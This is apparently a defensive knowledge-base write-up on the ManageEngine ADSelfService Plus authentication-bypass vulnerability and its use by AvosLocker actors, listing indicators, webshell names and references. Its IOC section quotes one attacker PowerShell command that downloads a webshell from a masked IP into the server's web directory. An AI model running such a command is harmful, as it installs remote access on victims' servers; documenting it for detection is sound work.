<h1> Introduction </h1>
Threat actors uncovered a significant vulnerability within ManageEngine's Software, Zoho, ADSelfService Plus, back in September 2021 which supports remote code execution after successful authentication bypass. ManageEngine ADSelfService Plus is a secure, web-based, end-user password reset management program. This software helps domain users to perform self service password reset, self service account unlock and employee self update of personal details in Microsoft Windows Active Directory. Many small to large corporations utilize this software for verifying credentials within the ticket management and documentation system.

For this exploit, attackers take advantage of the ManageEngine web servers being publicly exposed to the internet via port 80. This specific vulnerabilty includes an authentication bypass in ADSelfService Plus affecting the REST API URLs that could result in remote code execution. Rest API URLs are a progam interface that uses HTTP requests to access and use data. Within ADSelfService Plus, these are authenticated by a specific security filter. It was observed that attackers used specially crafted Rest API URLs that were able to bypass this security filter due to an error in normalizing the URLs before validation. This, in turn, gave attackers access to REST API endpoints, and they exploited the endpoints to perform subsequent attacks such as arbitrary command execution. One of the more famous attacks which utilized this initial access vector was the ransomware named "AvosLocker". 

https://www.kroll.com/en/insights/publications/cyber/avoslocker-ransomware-update

![image](https://github.com/jake-44/Knowledge-Base/assets/72994837/60a4747f-8bc7-457a-8bab-760941a62063)



<h1> IOCs and TTPs </h1>
In the case of our attack noted before, AvosLocker was seen in the wild, exploiting this known vulnerability. The threat actor utilized the vulnerability within ManageEngine to create a webshell named “help.jsp”. The webshell was created by a dropped Java Archive (.jar) named “stop.jar” that attempted to inject into “calc.exe” before creating “help.jsp” via encoded PowerShell scripts.

<br> **cmd.exe /x powershell -command Invoke-WebRequest -Uri hxxp://xx.xx.xx.xx/subshell.aspx -OutFile /ManageEngine/ADSelfServicePlus/webapps/adssp/help/admin-guide**

The webshell is then utilized to conduct initial discovery by running commands such as “whoami and “net user /domain” before placing two other webshells named “test.jsp” and “wg.jsp” on the server. The webshells “test.jsp” and “wg.jsp” appear to provide a simple text entry box, likely for executing commands on the server.


Some other techniques used include software such as:

**Dropper** – A trojan that drops a shell on the system

**Godzilla** – A Chinese language shell

**NGLite** – A backdoor for access  

<h2>Reverse Engineered Code</h2>

Unlike the targeted network, we are lucky that there are incidents of exploitation in the wild which utilized this vulnerability and the traffic was captured and back engineered to understand how this was is leveraged.

 ![image](https://github.com/jake-44/Knowledge-Base/assets/72994837/e4b002ac-4872-4fd2-b61a-06f6a54db838)

![image](https://github.com/jake-44/Knowledge-Base/assets/72994837/4c50face-3198-4b7b-9e34-a8152a05ade0)

The webshell was then utilized to conduct initial discovery by running commands such as “whoami and “net user /domain” before placing two other webshells named “test.jsp” and “wg.jsp” on the server. The webshells “test.jsp” and “wg.jsp” appear to provide a simple text entry box, likely for executing commands on the server.

![image](https://github.com/jake-44/Knowledge-Base/assets/72994837/af718a2a-d910-4993-a970-2cb8491f577b)


<h2>Conclusion</h2>

This vulnerability is dealt with through version patches and mitigation procedures documented online. However, some businesses rarely utilize EOL applications and software.


<h1>References</h1>

- https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html
- https://msrc-blog.microsoft.com/2021/03/16/guidance-for-responders-investigating-and-remediating-on-premises-exchange-server-vulnerabilities/
- https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html#:~:text=For%20a%20little%20more%20confort%2C%20it%20is%20also%20possible%20to%20exploit%20the%20file%20upload%20to%20write%20a%20JSP%20webshell%20on%20the%20filesystem.%20It%20can%20then%20be%20moved%20into%20the%20webroot%20with%20the%20Java%20code%20execution. - Red Team Exploitation Example
- https://www.microsoft.com/security/blog/2020/02/04/ghost-in-the-shell-investigating-web-shell-attacks/
- https://attack.mitre.org/techniques/T1505/003/
- https://pentest-tools.com/blog/detect-zoho-rce-cve-2021-40539 
- https://www.manageengine.com/products/self-service-password/advisory/CVE-2021-40539.html - ManageEngine's write-up
